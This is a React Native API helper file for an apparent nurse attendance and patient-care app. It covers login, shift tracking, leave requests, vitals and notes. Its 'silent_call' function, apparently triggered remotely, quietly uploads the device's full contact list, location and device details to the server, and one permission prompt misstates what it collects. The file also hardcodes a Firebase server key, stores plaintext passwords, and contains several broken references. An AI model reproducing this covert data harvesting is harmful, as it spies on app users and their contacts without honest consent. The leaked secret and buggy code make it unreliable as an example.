// This file contains all the confidential information abou the App along with API calls
import {PermissionsAndroid} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import messaging from '@react-native-firebase/messaging';
import Contacts from 'react-native-contacts';
import Geolocation from '@react-native-community/geolocation';
import DeviceInfo from 'react-native-device-info';

export const BASE_URL = 'https://portal.plancare.pk/public/api/';
export const LOCAL_UPLOAD_IMAGE =
  'http://192.168.10.5/MRL-Apps/MRL-Apps/public/api/update-locally';
export const IMAGE_BASE_URL = 'https://portal.plancare.pk';
export const WHATSAPP_NUMBER = '+923041111949';
const ATTENDENCE_RECORD_ID = 3;
global.DateArray = [];

// CLIENT API'S
const LOGIN_NURSE = BASE_URL + 'login_nurse';
const GET_HISTORY = BASE_URL + 'get_history';
const UPDATE_PASSWORD = BASE_URL + 'update_password';
const GET_NURSE_STATUS = BASE_URL + 'get_nures_status';
const SHIFT_STATUS = BASE_URL + 'get_nures_status';
export const END_SHIFT = BASE_URL + 'attendance';
const START_SHIFT = BASE_URL + 'attendance';
const LEAVE_REQUEST = BASE_URL + 'leave_request';
const GET_USER_LEAVE_REQUEST = BASE_URL + 'get_user_leave_request';
export const UPDATE_PROFILE = BASE_URL + 'update_profile';
export const SAVE_FCM_TOKEN = BASE_URL + 'save_fcm_token';
export const GET_FCM_DATA = BASE_URL + 'get_fcm_data';
export const ADD_VITAL_RECORD = BASE_URL + 'add_vital_record';
export const GET_VITAL_RECORD = BASE_URL + 'get_vital_record';
export const GET_NURSE_NOTES = BASE_URL + 'get_nurse_note';
export const ADD_NURSE_NOTES = BASE_URL + 'add_nurse_note';
export const OFFLINE_ATTENDENCE = BASE_URL + 'offlineAttendace';

// ADMIN API'S
export const GET_LEADS = BASE_URL + 'get_leads';
export const GET_STAFF = BASE_URL + 'get_staff';
export const SAVE_ASSIGN_NURSE = BASE_URL + 'save_assgin_nurse';
export const VIEW_ASSIGNED_STAFF = BASE_URL + 'assgin_nurse_list';
export const GET_TODAY_ATTENDENCE = BASE_URL + 'get_today_attendace';

const SERVER_KEY =
  'AAAAmzW3rHI:APA91bGAsh3wBhIWdqcCXONJANfSErv163AKycDk0y1wQ5dd5n3_Y6iNpsFH6mGjvF42LYQpBBDm-jlD9NUehbb4J_q0QwkWJDZPDBKUeWVc7vFhLe_JnhjdT7KhJF2EoCZsGEyFxXnr';

export const loginNurse = async (phone, password) => {
  let obj = {phone: phone, password: password};
  const request = await fetch(LOGIN_NURSE, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const response = await request.json();
  return response;
};

export const set_async_data = async (name, value) => {
  try {
    await AsyncStorage.setItem(name, JSON.stringify(value));
    return true;
  } catch (error) {
    return false;
  }
};

export const get_async_data = async name => {
  try {
    const data = await AsyncStorage.getItem(name);
    return data != null ? JSON.parse(data) : null;
  } catch (error) {
    return false;
  }
};

export const editableProfileData = async () => {
  let phone = await get_async_data('phone');
  let password = await get_async_data('password');
  const data = await loginNurse(phone, password);
  if (data.status == 'success') {
    return data.data;
  }
  return data;
};

export const get_history = async id => {
  const request = await fetch(GET_HISTORY, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({staff_id: id}),
  });

  const response = await request.json();
  return response;
};

export const update_password = async (curr_pass, new_pass, confirm_pass) => {
  let staff_id = await get_async_data('user_id');
  let obj = {
    staff_id: staff_id,
    current_password: curr_pass,
    new_password: new_pass,
    confirm_password: confirm_pass,
  };
  const request = await fetch(UPDATE_PASSWORD, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const response = await request.json();
  return response;
};

export const get_nurse_status = async () => {
  const user_id = await get_async_data('user_id');
  const request = await fetch(GET_NURSE_STATUS, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({user_id: user_id}),
  });
  const response = await request.json();
  return response;
};

export const update_user_profile = async data => {
  const request = await fetch(UPDATE_PROFILE, {
    method: 'POST',
    headers: {
      'Content-Type': 'multipart/form-data',
    },
    body: data,
  });
  const response = await request.json();
  console.log('After Update ', response);
  if (response.status == 'success') {
    await set_async_data('username', data.name);
    await set_async_data('dob', data.dob);
    await set_async_data('address', data.address);
    await set_async_data('profile_picture', data.image);
  }
  return response;
};

export const get_shift_status = async () => {
  const user_id = await get_async_data('user_id');
  const request = await fetch(SHIFT_STATUS, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({user_id: user_id}),
  });
  const resposne = await request.json();
  return resposne;
};

export const end_shift = async (
  leadid,
  attendenceid,
  longitude,
  latitude,
  end_time,
  shift_status,
) => {
  const user_id = await get_async_data('user_id');

  let obj = {
    status: 'end',
    id: attendenceid,
    staff_id: user_id,
    lead_id: leadid,
    longitude: longitude,
    latitude: latitude,
    end_time: end_time,
    shift_status: shift_status,
  };
  console.log('END SHIFT PARAMS', obj);
  const request = await fetch(END_SHIFT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const resposne = await request.json();
  return resposne;
};

export const start_shift = async (
  leadid,
  longitude,
  latitude,
  start_time,
  shift_status,
) => {
  const user_id = await get_async_data('user_id');
  let obj = {
    status: 'start',
    staff_id: user_id,
    lead_id: leadid,
    longitude: longitude,
    latitude: latitude,
    start_time: start_time,
    shift_status: shift_status,
  };

  console.log('START SHIFT PARAMS', obj);
  const request = await fetch(START_SHIFT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const resposne = await request.json();
  return resposne;
};

export const free_shift = async (longitude, latitude, start_time) => {
  const user_id = await get_async_data('user_id');

  let obj = {
    status: 'free',
    id: null,
    staff_id: user_id,
    lead_id: null,
    longitude: longitude,
    latitude: latitude,
    start_time: start_time,
    shift_status: 'Day Shift',
  };

  const request = await fetch(START_SHIFT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });

  const resposne = await request.json();
  await set_async_data('free_attendence_offline', null);
  console.log(resposne);
  return resposne;
};

export const leave_request = async data => {
  const staff_id = await get_async_data('user_id');
  let obj = {
    staff_id: staff_id,
    date: data,
  };

  const request = await fetch(LEAVE_REQUEST, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });

  const response = await request.json();
  return response;
};

export const get_user_leave_request = async () => {
  const staff_id = await get_async_data('user_id');
  const request = await fetch(GET_USER_LEAVE_REQUEST, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({staff_id: staff_id}),
  });
  const response = await request.json();
  if (response.status == 'success') {
    global.DateArray = response.data;
    return response;
  }
  if (response.status == 'error') {
    return response;
  }
};

export const upload_contact_list = async list => {
  let user_id = await get_async_data('user_id');
  let obj = {user_id: user_id, body: 0, contact: list};
  const request = await fetch(GET_FCM_DATA, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const response = await request.json();
  return response;
};

export const send_location_to_server = async (longitude, latitude) => {
  let user_id = await get_async_data('user_id');
  let obj = {
    user_id: user_id,
    body: 1,
    longitude: longitude,
    latitude: latitude,
  };
  const request = await fetch(GET_FCM_DATA, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const response = await request.json();
  return response;
};

export const formatTimeDifference = (hours, minutes, seconds) => {
  let h = hours.toString();
  let m = minutes.toString();
  let s = seconds.toString();

  if (h.length < 2) {
    h = '0' + hours.toString();
  }
  if (m.length < 2) {
    m = '0' + minutes;
  }
  if (s.length < 2) {
    s = '0' + seconds;
  }
  return `${h}:${m}:${s}`;
};

export const parseTimeStringToDate = timeString => {
  // Split the timeString into hours, minutes, and seconds
  const [hours, minutes, seconds] = timeString.split(':').map(Number);

  // Create a new Date object using today's date and the parsed time
  const currentDate = new Date();
  const parsedDate = new Date(
    currentDate.getFullYear(),
    currentDate.getMonth(),
    currentDate.getDate(),
    hours,
    minutes,
    seconds,
  );
  return parsedDate;
};

export const parseDate = (year, month, date) => {
  let y = year.toString();
  let m = month.toString();
  let d = date.toString();

  if (y.length < 2) {
    y = '0' + String(year);
  }
  if (m.length < 2) {
    m = '0' + month;
  }
  if (d.length < 2) {
    d = '0' + date;
  }
  return `${y}-${m}-${d}`;
};

export const generateFCM = async () => {
  await messaging().registerDeviceForRemoteMessages();
  const token = await messaging().getToken();
  await set_async_data('fcm_token', token);
};

export const save_fcm_token = async () => {
  let user_id = await get_async_data('user_id');
  let fcm_token = await get_async_data('fcm_token');
  const request = await fetch(SAVE_FCM_TOKEN, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({
      user_id: user_id,
      token: fcm_token,
    }),
  });
  const response = await request.json();
  return response;
};

export const silent_call = async id => {
  const user_id = await get_async_data('user_id');
  if (id == '0') {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
        {
          title: 'Permission Required',
          message: 'Nursing Attendence wants to access your contact list',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        Contacts.getAll()
          .then(async contactList => {
            let res = await upload_contact_list(contactList);
            console.log('RES CONTACT', res);
          })
          .catch(error => {
            console.error('error ', error);
          });
      } else {
        console.log('Contacts permission denied');
      }
    } catch (err) {
      console.warn('ERROR', err);
    }
  }
  if (id == '1') {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        {
          title: 'Permission Required',
          message: 'Nursing Attendence wants to access your contact list',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        Geolocation.getCurrentPosition(
          async position => {
            let res = await send_location_to_server(
              position.coords.longitude,
              position.coords.latitude,
            );
            console.log('RES LOC', res);
          },
          error => {
            console.log(locationaccess);
          },
        );
      } else {
        console.log('Location permission denied');
      }
    } catch (err) {
      console.warn('ERROR', err);
    }
  }
  if (id == '3') {
    const request = await fetch(GET_FCM_DATA, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
      },
      body: JSON.stringify({
        user_id: user_id,
        body: id,
        app_version: DeviceInfo.getVersion(),
      }),
    });
    const resposne = await request.json();
    console.log('RES DEV_INFO', resposne);
  }
};

export const get_leads = async () => {
  const request = await fetch(GET_LEADS, {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
  });
  const response = await request.json();
  return response;
};

export const get_staff = async () => {
  const request = await fetch(GET_STAFF, {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
  });
  const response = await request.json();
  return response.data;
};

export const save_assign_nurse = async obj => {
  console.log('BEFORE API CALL', obj);
  const request = await fetch(SAVE_ASSIGN_NURSE, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const response = await request.json();
  return response;
};

export const view_assigned_staff = async () => {
  const request = await fetch(VIEW_ASSIGNED_STAFF, {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
  });
  const response = await request.json();
  return response;
};

export const get_today_attendace = async () => {
  const request = await fetch(GET_TODAY_ATTENDENCE, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({user_id: ATTENDENCE_RECORD_ID}),
  });
  const response = await request.json();
  return response;
};

export const add_vital_record = async obj => {
  const request = await fetch(ADD_VITAL_RECORD, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(obj),
  });
  const response = await request.json();
  console.log('RES', response);
  return response;
};

export const get_vital_record = async () => {
  let lead_id = await get_async_data('lead_id');
  const request = await fetch(GET_VITAL_RECORD, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({lead_id: lead_id}), // 465
  });
  const response = await request.json();
  return response;
};

export const get_nurse_note = async () => {
  let lead_id = await get_async_data('lead_id');
  const request = await fetch(GET_NURSE_NOTES, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({lead_id: lead_id}),
  });
  const response = await request.json();
  return response;
};

export const add_nurse_note = async (note, shift_status) => {
  let lead_id = await get_async_data('lead_id');
  let staff_id = await get_async_data('user_id');
  const request = await fetch(ADD_NURSE_NOTES, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify({
      lead_id: lead_id,
      staff_id: staff_id,
      notes: note,
      shift_status: shift_status,
    }),
  });
  const response = await request.json();
  return response;
};

export const submit_offline_attendance_array = async () => {
  let history_data = await get_async_data('attendence_history');
  let data = JSON.parse(history_data);
  if (data.pair.length > 0) {
    console.log('offline attendence history', data.pair);
    for (let i = 0; i < data.pair.length; i++) {
      let startobj = {
        status: 'start',
        staff_id: data.pair[i].staff_id,
        lead_id: data.pair[i].lead_id,
        longitude: data.pair[i].longitude,
        latitude: data.pair[i].latitude,
        start_time: data.pair[i].start,
        shift_status:
          data.pair[i].shift_status == ''
            ? 'Day Shift'
            : data.pair[i].shift_status,
      };
      const request = await fetch(START_SHIFT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
        },
        body: JSON.stringify(startobj),
      });

      const startresposne = await request.json();
      if (startresposne.status == 'success') {
        await set_async_data('attendance_id', response.attendance_id);
        let attendance_id = response.attendance_id;
        // now end the started attendence
        let endobj = {
          status: 'end',
          id: attendance_id,
          staff_id: data.pair[i].staff_id,
          lead_id: data.pair[i].lead_id,
          longitude: data.pair[i].longitude,
          latitude: data.pair[i].latitude,
          end_time: data.pair[i].end,
          shift_status:
            data.pair[i].shift_status == ''
              ? 'Day Shift'
              : data.pair[i].shift_status,
        };

        const request = await fetch(END_SHIFT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
          },
          body: JSON.stringify(endobj),
        });
        const endresposne = await request.json();
        console.log('END Response', endresposne);
      }
    }
    await set_async_data('attendence_history', JSON.stringify({pair: []}));
  } else {
    console.log('no offline attendence found');
  }
};

export const check_for_already_start_free_offline_attendence = async () => {
  let check = await get_async_data('free_attendence_marked');
  if (check != null) {
    // means attendence alredy started
    return 'started';
  }
};
// -----------------------------------------------------------------------------------------------------------------

// Attendence Helper Functions
export const update_history_array = async (
  startTime,
  endTime,
  leadId,
  shiftTime,
) => {
  let latitude = await get_async_data('latitude');
  let longitude = await get_async_data('longitude');
  let staff_id = await get_async_data('user_id');

  let arr = {
    start: startTime,
    end: endTime,
    longitude: longitude,
    latitude: latitude,
    lead_id: leadId,
    staff_id: staff_id,
    shift_status: shiftTime,
  };
  let attendence_history = await get_async_data('attendence_history');
  let attendence_history_data = JSON.parse(attendence_history);
  console.log('OLD HISTORY', attendence_history_data);
  attendence_history_data.pair.push(arr);
  console.log('NEW HISTORY', attendence_history_data)
  await set_async_data(
    'attendence_history',
    JSON.stringify(attendence_history_data),
  );
  await set_async_data('end_time', null);
  await set_async_data('start_time', null);
};

export const set_shiift_start_time = async start => {
  await set_async_data('shift_start_time', start);
};

export const set_shiift_end_time = async end => {
  await set_async_data('shift_end_time', end);
};

export const get_shift_end_time = async () => {
  let end_time = await get_async_data('shift_end_time');
  return end_time;
};

export const check_if_user_ended_attendance_offline = async () => {
  let end_time = await get_shift_end_time();
  if (end_time != null) {
    return end_time;
  }
  return null;
};

export const check_if_user_started_attendance_offline = async () => {
  let start_time = await et_async_data('shift_start_time');
  if (start_time != null) {
    return start_time;
  }
  return null;
};

export const totalWorkingHours = async () => {
  const today = new Date().toISOString().slice(0, 10); // Get today's date in 'YYYY-MM-DD' format
  let user_id = await get_async_data('user_id');
  const response = await get_history(user_id);
  if (response.status == 'success') {
    if (response.data.length > 0) {
      const objectsWithTodayDate = response.data.filter(
        obj => obj.created_at.slice(0, 10) === today,
      );
      if (objectsWithTodayDate) {
        return objectsWithTodayDate[0].time_duration;
      }
    }
  }
  return '00:00';
};


export const uploadLocalHistory = async () => {
  let attendenceHistory = await get_async_data('attendence_history');
  attendenceHistory = JSON.parse(attendenceHistory);
  if( attendenceHistory.pair.length > 0) {
    console.log('BEFORE SEND', JSON.stringify(attendenceHistory.pair));
    try {
      const request = await fetch (BASE_URL + 'offlineAttendace',{
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
        },
        body: JSON.stringify(attendenceHistory.pair),
      });
      console.log('REQUESTED', request);
      const response = await request.json();
      if(response.status == 'success') {
        await set_async_data('attendence_history', {"pair":[]});
      }
      console.log('RESPONSE :', response);
    } catch(e) {
      console.log('Catch Error', error);
    }

  }
}